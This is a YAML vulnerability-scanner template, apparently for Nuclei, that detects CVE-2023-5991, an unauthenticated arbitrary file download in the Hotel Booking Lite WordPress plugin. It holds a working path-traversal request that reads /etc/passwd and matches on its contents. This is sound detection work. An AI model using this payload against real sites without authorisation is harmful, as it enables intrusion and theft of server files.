id: CVE-2023-5991

info:
  name: Hotel Booking Lite < 4.8.5 - Arbitrary File Download & Deletion
  author: Kazgangap
  severity: critical
  description: |
    The Hotel Booking Lite WordPress plugin before 4.8.5 does not validate file paths provided via user input, as well as does not have proper CSRF and authorisation checks, allowing unauthenticated users to download and delete arbitrary files on the server
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-5991
    - https://wpscan.com/vulnerability/e9d35e36-1e60-4483-b8b3-5cbf08fcd49e/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-5991
    cwe-id: CWE-22
    epss-score: 0.00603
    epss-percentile: 0.78406
    cpe: cpe:2.3:a:motopress:hotel_booking_lite:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: motopress
    product: hotel_booking_lite
    framework: wordpress
  tags: cve,cve2023,lfi,hbl,hotel

http:
  - method: GET
    path:
      - "{{BaseURL}}/?filename=../../../../../../etc/passwd&mphb_action=download"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
